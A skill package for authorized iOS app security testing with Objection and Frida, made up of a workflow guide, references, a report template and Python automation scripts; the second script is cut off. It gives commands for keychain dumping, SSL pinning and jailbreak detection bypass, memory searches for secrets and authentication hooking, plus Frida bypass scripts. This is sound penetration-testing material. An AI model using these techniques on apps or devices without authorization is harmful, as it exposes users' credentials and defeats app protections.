

===== FILE: skills/analyzing-ios-app-security-with-objection/SKILL.md =====
---
name: analyzing-ios-app-security-with-objection
description: >-
  Runtime iOS app security testing with Objection (Frida): inspect keychain and
  filesystem data, explore app internals at runtime, and validate/bypass
  client-side protections during authorized mobile assessments.
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- ios
- objection
- frida
- owasp-mobile
- penetration-testing
version: 1.0.0
license: Apache-2.0
atlas_techniques:
- AML.T0054
nist_ai_rmf:
- MEASURE-2.7
- MANAGE-2.4
- GOVERN-6.2
- MAP-5.1
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1635
- T1414
- T1417.001
- T1409
---
# Analyzing iOS App Security with Objection

## When to Use

Use this skill when:
- Performing runtime security assessment of iOS applications during authorized penetration tests
- Inspecting iOS keychain, filesystem, and memory for sensitive data exposure
- Bypassing client-side security controls (SSL pinning, jailbreak detection) during security testing
- Evaluating iOS app behavior at runtime without access to source code

**Do not use** this skill on production devices without explicit authorization -- Objection modifies app runtime behavior and may trigger security monitoring.

## Prerequisites

- Python 3.10+ with pip
- Objection installed: `pip install objection`
- Frida installed: `pip install frida-tools`
- Target iOS device (jailbroken with Frida server, or non-jailbroken with repackaged IPA)
- For non-jailbroken: `objection patchipa` to inject Frida gadget into IPA
- macOS recommended for iOS testing (Xcode, ideviceinstaller)
- USB connection to target device or network Frida server

## Workflow

### Step 1: Prepare the Testing Environment

**For jailbroken devices:**
```bash
# Install Frida server on device via Cydia/Sileo
# SSH to device and start Frida server
ssh root@<device_ip> "/usr/sbin/frida-server -D"

# Verify Frida connectivity
frida-ps -U  # List processes on USB-connected device
```

**For non-jailbroken devices (authorized testing):**
```bash
# Patch IPA with Frida gadget
objection patchipa --source target.ipa --codesign-signature "Apple Development: test@example.com"

# Install patched IPA
ideviceinstaller -i target-patched.ipa
```

### Step 2: Attach Objection to Target App

```bash
# Attach to running app by bundle ID
objection --gadget "com.target.app" explore

# Or spawn the app fresh
objection --gadget "com.target.app" explore --startup-command "ios hooking list classes"
```

Once attached, Objection provides an interactive REPL for runtime exploration.

### Step 3: Assess Data Storage Security (MASVS-STORAGE)

```bash
# Dump iOS Keychain items accessible to the app
ios keychain dump

# List files in app sandbox
ios plist cat Info.plist
env  # Show app environment paths

# Inspect NSUserDefaults for sensitive data
ios nsuserdefaults get

# List SQLite databases
sqlite connect app_data.db
sqlite execute query "SELECT * FROM credentials"

# Check for sensitive data in pasteboard
ios pasteboard monitor
```

### Step 4: Evaluate Network Security (MASVS-NETWORK)

```bash
# Disable SSL/TLS certificate pinning
ios sslpinning disable

# Verify pinning is bypassed by observing traffic in Burp Suite proxy
# Monitor network-related class method calls
ios hooking watch class NSURLSession
ios hooking watch class NSURLConnection
```

### Step 5: Inspect Authentication and Authorization (MASVS-AUTH)

```bash
# List all Objective-C classes
ios hooking list classes

# Search for authentication-related classes
ios hooking search classes Auth
ios hooking search classes Login
ios hooking search classes Token

# Hook authentication methods to observe parameters
ios hooking watch method "+[AuthManager validateToken:]" --dump-args --dump-return

# Monitor biometric authentication calls
ios hooking watch class LAContext
```

### Step 6: Assess Binary Protections (MASVS-RESILIENCE)

```bash
# Check jailbreak detection implementation
ios jailbreak disable

# Simulate jailbreak detection bypass
ios jailbreak simulate

# List loaded frameworks and libraries
memory list modules

# Search memory for sensitive strings
memory search "password" --string
memory search "api_key" --string
memory search "Bearer" --string

# Dump specific memory regions
memory dump all dump_output/
```

### Step 7: Review Platform Interaction (MASVS-PLATFORM)

```bash
# List URL schemes registered by the app
ios info binary
ios bundles list_frameworks

# Hook URL scheme handlers
ios hooking watch method "-[AppDelegate application:openURL:options:]" --dump-args

# Monitor clipboard access
ios pasteboard monitor

# Check for custom keyboard restrictions
ios hooking search classes UITextField
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **Objection** | Runtime mobile exploration toolkit built on Frida that provides pre-built scripts for common security testing tasks |
| **Frida Gadget** | Shared library injected into app process to enable Frida instrumentation without jailbreak |
| **Keychain** | iOS secure credential storage system; Objection can dump items accessible to the target app's keychain access group |
| **SSL Pinning Bypass** | Runtime modification of certificate validation logic to allow proxy interception of HTTPS traffic |
| **Method Hooking** | Intercepting Objective-C/Swift method calls at runtime to observe arguments, return values, and modify behavior |

## Tools & Systems

- **Objection**: High-level Frida-powered mobile security exploration toolkit with pre-built commands
- **Frida**: Dynamic instrumentation framework providing JavaScript injection into native app processes
- **Frida-tools**: CLI utilities for Frida including frida-ps, frida-trace, and frida-discover
- **ideviceinstaller**: Cross-platform tool for installing/managing iOS apps via USB
- **Burp Suite**: HTTP proxy for intercepting traffic after SSL pinning bypass

## Common Pitfalls

- **App crashes on attach**: Some apps implement Frida detection. Use `--startup-command` to hook anti-Frida checks early in the app lifecycle.
- **Keychain access scope**: Objection can only dump keychain items within the app's access group. System keychain items require separate jailbreak-level tools.
- **Swift name mangling**: Swift method names are mangled in the runtime. Use `ios hooking list classes` with grep to find demangled names.
- **Non-persistent changes**: All Objection modifications are runtime-only and reset on app restart. Document findings immediately.

===== END FILE =====


===== FILE: skills/analyzing-ios-app-security-with-objection/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/analyzing-ios-app-security-with-objection/assets/template.md =====
# iOS Objection Security Assessment Report

## Engagement Information

| Field | Value |
|-------|-------|
| Application | [APP_NAME] |
| Bundle ID | [BUNDLE_ID] |
| iOS Version | [IOS_VERSION] |
| Device | [DEVICE_MODEL] |
| Device State | [Jailbroken/Non-Jailbroken] |
| Assessment Date | [DATE] |
| Analyst | [ANALYST] |
| Objection Version | [VERSION] |

## Executive Summary

[Brief narrative of findings from Objection runtime analysis]

## Keychain Analysis

| Service | Account | Data Type | Protection Class | Risk |
|---------|---------|-----------|-----------------|------|
| [SERVICE] | [ACCOUNT] | [TYPE] | [CLASS] | [RISK] |

**Findings**: [Description of sensitive data found in keychain]

## Data Storage Assessment

### NSUserDefaults
| Key | Contains Sensitive Data | Risk |
|-----|----------------------|------|
| [KEY] | [YES/NO] | [RISK] |

### SQLite Databases
| Database | Encrypted | Sensitive Tables | Risk |
|----------|-----------|-----------------|------|
| [DB_NAME] | [YES/NO] | [TABLES] | [RISK] |

### Filesystem
| Path | Contents | Protection | Risk |
|------|----------|-----------|------|
| [PATH] | [DESCRIPTION] | [ATTRIBUTE] | [RISK] |

## Network Security

| Check | Result | Details |
|-------|--------|---------|
| SSL Pinning Present | [YES/NO] | [IMPLEMENTATION_DETAILS] |
| SSL Pinning Bypass | [SUCCESS/FAIL] | [METHOD_USED] |
| ATS Configuration | [STRICT/RELAXED] | [EXCEPTIONS] |

## Binary Protection Assessment

| Protection | Status | Details |
|-----------|--------|---------|
| Jailbreak Detection | [Present/Absent] | [BYPASS_DIFFICULTY] |
| Frida Detection | [Present/Absent] | [DETAILS] |
| Debug Detection | [Present/Absent] | [DETAILS] |
| Code Obfuscation | [Yes/No] | [DETAILS] |

## Memory Analysis

| Search Pattern | Found | Risk | Details |
|---------------|-------|------|---------|
| Passwords | [YES/NO] | [RISK] | [DETAILS] |
| Auth Tokens | [YES/NO] | [RISK] | [DETAILS] |
| API Keys | [YES/NO] | [RISK] | [DETAILS] |
| JWTs | [YES/NO] | [RISK] | [DETAILS] |

## Recommendations

### Critical
1. [RECOMMENDATION]

### High
1. [RECOMMENDATION]

### Medium
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/analyzing-ios-app-security-with-objection/references/api-reference.md =====
# API Reference: iOS App Security with Objection

## Objection CLI

### Launch
```bash
objection -g com.example.app explore          # Attach to running app
objection -g com.example.app explore -s "command"  # Run startup command
objection patchipa --source app.ipa           # Patch IPA with Frida gadget
```

### Keychain & Data Storage
```bash
ios keychain dump                    # Dump keychain items
ios keychain dump --json             # JSON output
ios cookies get                      # List HTTP cookies
ios nsuserdefaults get               # Read NSUserDefaults
ios plist cat Info.plist             # Read plist file
```

### SSL Pinning
```bash
ios sslpinning disable               # Bypass SSL pinning
ios sslpinning disable --quiet        # Quiet mode
```

### Jailbreak Detection
```bash
ios jailbreak disable                 # Bypass jailbreak detection
ios jailbreak simulate                # Simulate jailbroken device
```

### Hooking
```bash
ios hooking list classes                        # List all classes
ios hooking list classes --include Auth          # Filter classes
ios hooking list class_methods ClassName         # List methods
ios hooking watch method "-[Class method]"       # Watch method calls
ios hooking set return_value "-[Class isJB]" false  # Override return
```

### Filesystem
```bash
ls /                                  # List app sandbox root
ls /Documents                         # List Documents directory
file download /path/to/file local.out  # Download file
file upload local.file /remote/path    # Upload file
```

### Memory
```bash
memory dump all dump.bin              # Dump all memory
memory search "password"              # Search memory for string
memory list modules                   # List loaded modules
memory list exports libModule.dylib   # List module exports
```

## Frida CLI

### Syntax
```bash
frida -U -n AppName                   # Attach by name
frida -U -f com.app.id                # Spawn and attach
frida -U -n AppName -l script.js      # Load script
frida-ps -U                           # List running processes
frida-ls-devices                      # List connected devices
```

### Common Frida Scripts
```javascript
// Hook method and log arguments
ObjC.choose(ObjC.classes.ClassName, {
    onMatch: function(instance) {
        Interceptor.attach(instance['- methodName:'].implementation, {
            onEnter: function(args) {
                console.log('arg1:', ObjC.Object(args[2]));
            }
        });
    }, onComplete: function() {}
});
```

## OWASP Mobile Top 10 (2024)

| ID | Category | Objection Check |
|----|----------|-----------------|
| M1 | Improper Credential Usage | `ios keychain dump` |
| M2 | Inadequate Supply Chain Security | Binary analysis |
| M3 | Insecure Authentication | Hook auth classes |
| M4 | Insufficient Input/Output Validation | Hook input methods |
| M5 | Insecure Communication | `ios sslpinning disable` |
| M6 | Inadequate Privacy Controls | `ios nsuserdefaults get` |
| M7 | Insufficient Binary Protections | Check PIE, ARC, stack canary |
| M8 | Security Misconfiguration | `ios plist cat Info.plist` |
| M9 | Insecure Data Storage | Filesystem + keychain review |
| M10 | Insufficient Cryptography | Hook crypto classes |

## iOS App Sandbox Paths
| Path | Contents |
|------|----------|
| `/Documents` | User-generated data |
| `/Library/Caches` | Cached data |
| `/Library/Preferences` | Plist settings |
| `/tmp` | Temporary files |
| `/Library/Cookies` | Cookie storage |

===== END FILE =====


===== FILE: skills/analyzing-ios-app-security-with-objection/references/standards.md =====
# Standards Reference: iOS App Security with Objection

## OWASP Mobile Top 10 2024 Mapping

| OWASP ID | Risk | Objection Testing Coverage |
|----------|------|---------------------------|
| M1 | Improper Credential Usage | Keychain dumping, memory string search for hardcoded credentials |
| M3 | Insecure Authentication/Authorization | Hook authentication methods, bypass biometric checks |
| M5 | Insecure Communication | SSL pinning bypass, network class hooking |
| M7 | Insufficient Binary Protections | Jailbreak detection bypass, Frida detection assessment |
| M8 | Security Misconfiguration | Info.plist review, URL scheme analysis, ATS configuration |
| M9 | Insecure Data Storage | NSUserDefaults inspection, SQLite database access, file system review |

## OWASP MASVS v2.0 Control Mapping

| MASVS Category | Objection Commands | Assessment Area |
|----------------|-------------------|-----------------|
| MASVS-STORAGE | `ios keychain dump`, `ios nsuserdefaults get`, `sqlite connect` | Sensitive data in keychain, NSUserDefaults, databases |
| MASVS-CRYPTO | `memory search`, hook crypto framework calls | Key storage, algorithm selection |
| MASVS-AUTH | Hook LAContext, authentication classes | Biometric bypass, session management |
| MASVS-NETWORK | `ios sslpinning disable`, hook NSURLSession | Certificate pinning, cleartext traffic |
| MASVS-PLATFORM | Hook URL scheme handlers, pasteboard monitor | Deep link security, clipboard exposure |
| MASVS-CODE | `memory list modules`, binary inspection | Debugging symbols, framework analysis |
| MASVS-RESILIENCE | `ios jailbreak disable`, Frida detection hooks | Anti-tampering, anti-debugging |

## OWASP MASTG Test Cases

| Test ID | Description | Objection Approach |
|---------|-------------|-------------------|
| MASTG-TEST-0053 | Testing Local Storage for Sensitive Data | `ios keychain dump`, filesystem inspection |
| MASTG-TEST-0057 | Testing Backups for Sensitive Data | Check backup exclusion attributes |
| MASTG-TEST-0060 | Testing Custom URL Schemes | Hook `application:openURL:options:` |
| MASTG-TEST-0063 | Testing for Sensitive Data in Logs | Monitor NSLog calls via hooking |
| MASTG-TEST-0066 | Testing Enforced App Transport Security | Inspect Info.plist ATS configuration |

## Apple Platform Security Requirements

| Requirement | Assessment Method |
|-------------|-------------------|
| Keychain Access Control | Verify kSecAttrAccessible values via keychain dump |
| App Transport Security | Check Info.plist for NSAllowsArbitraryLoads exceptions |
| Data Protection API | Verify file protection attributes on sensitive files |
| Secure Enclave Usage | Hook SecKey operations for biometric-protected keys |

===== END FILE =====


===== FILE: skills/analyzing-ios-app-security-with-objection/references/workflows.md =====
# Workflows: iOS App Security with Objection

## Workflow 1: iOS Runtime Security Assessment

```
[Setup Environment] --> [Prepare Device] --> [Attach Objection] --> [Runtime Analysis]
       |                      |                     |                      |
       v                      v                     v                      v
[Install Frida]      [Jailbroken: Start    [Connect via USB]    [Data Storage Check]
[Install Objection]   frida-server]        [Spawn target app]   [Network Security]
                     [Non-JB: Patch IPA]                        [Auth Mechanism Review]
                                                                [Binary Protection Test]
                                                                         |
                                                                         v
                                                                [Document Findings]
                                                                [Generate Report]
```

## Workflow 2: SSL Pinning Bypass for Traffic Interception

```
[Configure Burp Proxy] --> [Set device proxy] --> [Attach Objection]
                                                        |
                                                        v
                                              [ios sslpinning disable]
                                                        |
                                                        v
                                              [Navigate app in browser/UI]
                                                        |
                                                        v
                                              [Capture HTTPS traffic in Burp]
                                              [Analyze API endpoints]
                                              [Test authentication flows]
                                              [Check for sensitive data in transit]
```

## Workflow 3: Keychain and Data Storage Assessment

```
[Attach Objection] --> [ios keychain dump] --> [Analyze keychain items]
                              |                        |
                              v                        v
                    [ios nsuserdefaults get]   [Check protection classes]
                              |               [Identify sensitive tokens]
                              v               [Verify encryption at rest]
                    [List app sandbox files]
                              |
                              v
                    [sqlite connect *.db]
                    [Query sensitive tables]
                              |
                              v
                    [memory search "password"]
                    [memory search "token"]
                    [memory search "secret"]
```

## Workflow 4: Jailbreak Detection Assessment

```
[Attach Objection] --> [ios jailbreak disable] --> [Navigate app]
                              |                          |
                              v                   [App functions normally?]
                    [Hook detection methods]        /           \
                    [Monitor file checks]       [Yes]          [No]
                    [Monitor Cydia URL scheme]    |              |
                              |               [Detection       [Additional detection
                              v                bypassed]        methods exist]
                    [Document detection                          |
                     methods found]                    [Hook deeper: search
                    [Assess bypass                      for custom checks]
                     difficulty]                       [Frida script for
                                                       targeted bypass]
```

## Decision Matrix: Testing Approach

| Device State | IPA Access | Approach |
|-------------|-----------|----------|
| Jailbroken | Not needed | Direct Frida server + Objection attach |
| Non-jailbroken | Available | Patch IPA with `objection patchipa` |
| Non-jailbroken | Not available | Request IPA from client or use device management |
| Emulator | N/A | Limited: Frida on Corellium or similar platform |

===== END FILE =====


===== FILE: skills/analyzing-ios-app-security-with-objection/scripts/agent.py =====
#!/usr/bin/env python3
"""iOS app security analysis agent using Objection/Frida concepts.

Performs runtime security assessment of iOS apps including SSL pinning bypass,
keychain dumping, filesystem inspection, and jailbreak detection bypass.
"""

import subprocess
import json
import sys


def run_objection(command, app_id=None, timeout=30):
    """Execute an Objection command against a target app."""
    cmd = ["objection"]
    if app_id:
        cmd.extend(["-g", app_id])
    cmd.extend(["explore", "-c", command])
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.returncode
    except FileNotFoundError:
        return "objection not installed (pip install objection)", 1
    except subprocess.TimeoutExpired:
        return "Command timed out", 1


def run_frida(script_code, app_id, timeout=30):
    """Execute a Frida script against target app."""
    cmd = ["frida", "-U", "-n", app_id, "-e", script_code]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.returncode
    except FileNotFoundError:
        return "frida not installed (pip install frida-tools)", 1
    except subprocess.TimeoutExpired:
        return "Command timed out", 1


def dump_keychain(app_id):
    """Dump keychain items accessible by the application."""
    return run_objection("ios keychain dump", app_id)


def dump_cookies(app_id):
    """Dump HTTP cookies stored by the application."""
    return run_objection("ios cookies get", app_id)


def list_classes(app_id, filter_str=None):
    """List Objective-C classes loaded in the app."""
    cmd = "ios hooking list classes"
    if filter_str:
        cmd += f" --include {filter_str}"
    return run_objection(cmd, app_id)


def check_ssl_pinning(app_id):
    """Check and bypass SSL certificate pinning."""
    return run_objection("ios sslpinning disable", app_id)


def check_jailbreak_detection(app_id):
    """Check for and bypass jailbreak detection."""
    return run_objection("ios jailbreak disable", app_id)


def inspect_filesystem(app_id, path="/"):
    """Inspect the application's filesystem sandbox."""
    return run_objection(f"ls {path}", app_id)


def dump_plist(app_id):
    """Dump application plist configuration files."""
    return run_objection("ios plist cat Info.plist", app_id)


def check_pasteboard(app_id):
    """Check pasteboard/clipboard for sensitive data."""
    return run_objection("ios pasteboard monitor", app_id)


def search_binary_strings(app_id, pattern):
    """Search for strings in the app binary."""
    return run_objection(f"memory search '{pattern}'", app_id)


OWASP_MOBILE_CHECKS = {
    "M1_Improper_Platform_Usage": {
        "checks": ["ios keychain dump", "ios plist cat Info.plist"],
        "description": "Check for misuse of platform security features",
    },
    "M2_Insecure_Data_Storage": {
        "checks": ["ios keychain dump", "ios cookies get", "ios nsuserdefaults get"],
        "description": "Check for sensitive data in insecure storage",
    },
    "M3_Insecure_Communication": {
        "checks": ["ios sslpinning disable"],
        "description": "Test SSL/TLS implementation and certificate pinning",
    },
    "M4_Insecure_Authentication": {
        "checks": ["ios hooking list classes --include Auth",
                    "ios hooking list classes --include Login"],
        "description": "Analyze authentication mechanisms",
    },
    "M5_Insufficient_Cryptography": {
        "checks": ["ios hooking list classes --include Crypto",
                    "ios hooking list classes --include AES"],
        "description": "Review cryptographic implementations",
    },
    "M8_Code_Tampering": {
        "checks": ["ios jailbreak disable"],
        "description": "Test runtime integrity and jailbreak detection",
    },
    "M9_Reverse_Engineering": {
        "checks": ["ios hooking list classes"],
        "description": "Assess reverse engineering protections",
    },
}


def run_owasp_assessment(app_id):
    """Run OWASP Mobile Top 10 security checks."""
    results = {}
    for category, config in OWASP_MOBILE_CHECKS.items():
        category_results = {"description": config["description"], "findings": []}
        for check in config["checks"]:
            output, rc = run_objection(check, app_id)
            category_results["findings"].append({
                "command": check,
                "status": "success" if rc == 0 else "failed",
                "output_preview": output[:200] if output else "",
            })
        results[category] = category_results
    return results


FRIDA_SCRIPTS = {
    "ssl_pinning_bypass": """
ObjC.choose(ObjC.classes.NSURLSessionConfiguration, {
    onMatch: function(instance) {
        instance['- setTLSMinimumSupportedProtocol:'](0);
    }, onComplete: function() {}
});
""",
    "jailbreak_bypass": """
var paths = ['/Applications/Cydia.app', '/usr/sbin/sshd', '/etc/apt'];
Interceptor.attach(ObjC.classes.NSFileManager['- fileExistsAtPath:'].implementation, {
    onEnter: function(args) { this.path = ObjC.Object(args[2]).toString(); },
    onLeave: function(retval) {
        if (paths.some(p => this.path.includes(p))) retval.replace(0);
    }
});
""",
    "keychain_dump": """
var kSecClass = ObjC.classes.__NSDictionary.dictionaryWithObject_forKey_(
    ObjC.classes.__NSCFConstantString.alloc().initWithUTF8String_('genp'),
    ObjC.classes.__NSCFConstantString.alloc().initWithUTF8String_('class')
);
console.log('Keychain query prepared');
""",
}


def generate_report(app_id, assessment_results):
    """Generate iOS security assessment report."""
    findings_count = sum(
        len(cat["findings"]) for cat in assessment_results.values()
    )
    return {
        "app_identifier": app_id,
        "assessment_framework": "OWASP Mobile Top 10",
        "categories_tested": len(assessment_results),
        "total_checks": findings_count,
        "results": assessment_results,
    }


if __name__ == "__main__":
    print("=" * 60)
    print("iOS App Security Analysis Agent (Objection/Frida)")
    print("Runtime analysis, SSL bypass, keychain dump, OWASP checks")
    print("=" * 60)

    app_id = sys.argv[1] if len(sys.argv) > 1 else None

    if not app_id:
        print("\n[DEMO] Usage: python agent.py <app_bundle_id>")
        print("  e.g. python agent.py com.example.app")
        print("\nAvailable checks:")
        for category, config in OWASP_MOBILE_CHECKS.items():
            print(f"  {category}: {config['description']}")
        print("\nFrida scripts available:")
        for name in FRIDA_SCRIPTS:
            print(f"  {name}")
        sys.exit(0)

    print(f"\n[*] Target: {app_id}")
    print("[*] Running OWASP Mobile Top 10 assessment...")

    results = run_owasp_assessment(app_id)
    report = generate_report(app_id, results)

    for category, data in results.items():
        status_counts = {"success": 0, "failed": 0}
        for f in data["findings"]:
            status_counts[f["status"]] += 1
        print(f"\n  [{category}] {data['description']}")
        print(f"    Checks: {status_counts['success']} passed, {status_counts['failed']} failed")

    print(f"\n{json.dumps(report, indent=2, default=str)}")

===== END FILE =====


===== FILE: skills/analyzing-ios-app-security-with-objection/scripts/process.py =====
#!/usr/bin/env python3
"""
Objection iOS Security Assessment Automation

Automates common Objection commands for iOS app security testing.
Runs keychain dump, storage inspection, SSL pinning check, and jailbreak detection analysis.

Usage:
    python process.py --bundle-id com.target.app [--device-id UDID] [--output report.json]
"""

import argparse
import json
import subprocess
import sys
import re
from datetime import datetime
from pathlib import Path


class ObjectionAssessor:
    """Automates Objection-based iOS security assessment tasks."""

    def __init__(self, bundle_id: str, device_id: str = None):
        self.bundle_id = bundle_id
        self.device_id = device_id
        self.findings = []

    def _run_objection_command(self, command: str, timeout: int = 30) -> str:
        """Execute an Objection command and return output."""
        cmd = ["objection", "--gadget", self.bundle_id, "run", command]
        if self.device_id:
            cmd.insert(1, "--serial")
            cmd.insert(2, self.device_id)

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return f"TIMEOUT: Command '{command}' exceeded {timeout}s"
        except FileNotFoundError:
            return "ERROR: Objection not found. Install with: pip install objection"

    def _run_frida_command(self, script: str, timeout: int = 15) -> str:
        """Execute a Frida script snippet."""
        cmd = ["frida", "-U", "-n", self.bundle_id, "-e", script]
        if self.device_id:
            cmd.extend(["-D", self.device_id])

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return ""

    def check_frida_connectivity(self) -> dict:
        """Verify Frida can connect to the device."""
        cmd = ["frida-ps", "-U"]
        if self.device_id:
            cmd.extend(["-D", self.device_id])

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            connected = result.returncode == 0
            processes = len(result.stdout.strip().split("\n")) - 1 if connected else 0
            return {
                "connected": connected,
                "process_count": processes,
                "target_running": self.bundle_id in result.stdout,
            }
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return {"connected": False, "process_count": 0, "target_running": False}

    def dump_keychain(self) -> dict:
        """Dump keychain items accessible to the app."""
        output = self._run_objection_command("ios keychain dump")
        items = []
        current_item = {}

        for line in output.split("\n"):
            line = line.strip()
            if "Service" in line and ":" in line:
                if current_item:
                    items.append(current_item)
                current_item = {"service": line.split(":", 1)[-1].strip()}
            elif "Account" in line and ":" in line:
